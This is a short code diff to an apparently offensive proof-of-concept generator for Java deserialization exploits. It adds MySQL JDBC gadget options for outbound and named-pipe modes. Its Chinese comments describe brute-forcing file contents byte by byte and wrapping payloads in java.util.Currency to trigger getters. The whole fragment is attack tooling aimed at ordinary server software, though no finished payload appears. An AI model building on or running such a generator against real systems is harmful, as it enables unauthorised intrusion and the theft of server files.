@@ -237,6 +237,9 @@ def generate_poc_1268(
         user=opts.user,
         jdbc_url=opts.jdbc_url,
         socket_factory_arg=socket_arg,
+        mysql_version=opts.mysql_version,
+        outbound=opts.outbound,
+        named_pipe_path=opts.named_pipe_path,
     )
     if opts.wrap_currency:
         raw = wrap_with_currency(raw, currency_field=opts.currency_field)
@@ -252,6 +255,15 @@ def generate_poc_1268(
             "将按 read_charset（mixed/lower/printable）逐字节爆破；"
             "仅生成单探针时用 guess_byte / bom_bytes。"
         )
+    if entry.id == "mysql_jdbc":
+        ver = opts.mysql_version or "5.1"
+        if opts.outbound:
+            notes.append(f"MySQL JDBC {ver} 出网模式。")
+        else:
+            notes.append(
+                f"MySQL JDBC {ver} 不出网（NamedPipe）；需先写 pipe："
+                f"{opts.named_pipe_path or '/tmp/mysql.pcap'}"
+            )
     if opts.wrap_currency:
         notes.append(
             f"已套 java.util.Currency（字段 {opts.currency_field}）以触发 getter。"
